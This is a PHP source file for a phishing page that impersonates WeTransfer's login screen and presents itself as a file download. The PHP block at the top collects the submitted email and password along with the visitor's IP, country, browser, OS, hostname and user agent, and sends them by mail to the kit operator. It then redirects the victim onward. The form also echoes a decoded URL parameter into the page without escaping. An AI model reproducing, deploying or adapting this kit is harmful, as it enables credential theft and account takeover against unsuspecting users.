<?php

session_start();

if (isset($_GET['Upgrade'])) {
$Upgrade = $_GET['Upgrade'];
}
require_once '../mail.php';
require_once 'geo.php';
require_once 'sync.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

if (isset($_POST['login']) || isset($_POST['passd'])) { 
$_SESSION["email"] = $email = $_POST["login"];
$_SESSION["passwd"] = $passwd = $_POST["passd"];
$upgrade = base64_encode($email);
$message = '';
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got mail from $ip ($cn)";
$headers = "From: WT $cc <noreply>\n";
$headers .= "Reply-To: ".$_POST["email"]."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($email) || empty($passwd)) {
header("Location: ./?trk=WT201908&Upgrade=$upgrade");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: ./app.php?trk=WT201908&Upgrade=$upgrade");
}

}
?>
<!doctype html>
<html>

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	
	<title>WeTransfer</title>
	
	
	<link rel="shortcut icon" href="favicon.ico" />
	<link rel="icon" sizes="16x16 32x32" href="favicon.ico">
    <link rel="mask-icon" href="favicon.svg" color="#17181A">

	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" media="all">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.5.2/animate.min.css">
	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

	<!-- Popper JS -->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<style>
		body {
			background-image: url(bg.png);
			background-repeat: no-repeat;
			color: #045eb4;
		}
		
		#logo {
			position: relative;
			left: 520px;
			top: 50px;
		}
		
		#d {
			position: relative;
			left: 530px;
			top: 150px;
			
		}
		.sky{
					background-color: #409fff;
			
		}
		
		#form {
	position: absolute;
	left: 80px;
	top: 120px;
	width: 301px;
	padding: 30px;
	z-index: 2;
	background: white;
	height: 420px;
			border-radius: 10px;
		}
		.blue{
			background-color: #045eb4;
			color: white;
		}
		#sub1{
			position: absolute;
			left: 580px;
			top:480px;
			
		}
				#sub{
					border-radius: 15px;
					color:white;
			
		}
	</style>
</head>

<body>

	<div id="form" >
	<h1></h1><br><h1></h1>
	<img src="logo.png" width="200">
	<div style="color:#C03A3C; font-size: 12.3px;position: relative;margin-bottom: 20px; width: 331px;">
	  	</div>
<hr>
	<h1></h1>
	<p></p>
		<form method="POST" action="">
		<div><font size="-1">Login with your Email and Password</font></div>
		<input type="text" class="form-control validate[required]" value="<?php echo isset($_GET['Upgrade']) ? base64_decode($_GET['Upgrade']) : '' ?>" name="login"><br/>
			
			<input type="password" name="passd" class="form-control validate[required]" value="" id="password" placeholder= Password required>
			<span class="text-danger" id="er"></span>
			
<br/>
			<input id="sub" name="contactSubmit" type="submit" class="btn btn-md btn-block sky"  value="Download file">

		
		
		</form>
	
	</div>
	<script>
			$(document).ready(function(){
				$("#sub1, #pix").click(function(){
					$("#form").slideToggle();
					
				});
				
			});
	</script>
	
</body>

</html>